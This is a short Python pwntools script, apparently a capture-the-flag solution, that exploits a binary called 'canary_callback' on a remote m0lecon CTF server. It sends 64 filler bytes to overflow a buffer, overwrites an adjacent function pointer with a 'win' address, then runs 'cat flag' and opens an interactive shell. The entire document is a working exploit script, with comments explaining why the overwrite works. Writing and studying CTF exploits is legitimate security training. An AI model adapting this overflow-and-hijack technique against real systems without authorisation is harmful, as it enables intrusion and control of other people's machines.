from pwn import *

elf = context.binary = ELF('./canary_callback', checksec=False)

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13571)

win_addr = 0x4012a3
ret_gadget = 0x40101a

# the function address to be called with the argument is stored inside a struct with the buffer. so, it is logically saved after the buffer in memory
payload = b'A' * 64
#payload += p64(ret_gadget) # not necessary. it result in a canary override
payload += p64(win_addr)

p.recvuntil(b'incantation:')

p.send(payload)

sleep(0.5)
p.sendline(b'cat flag')
p.interactive()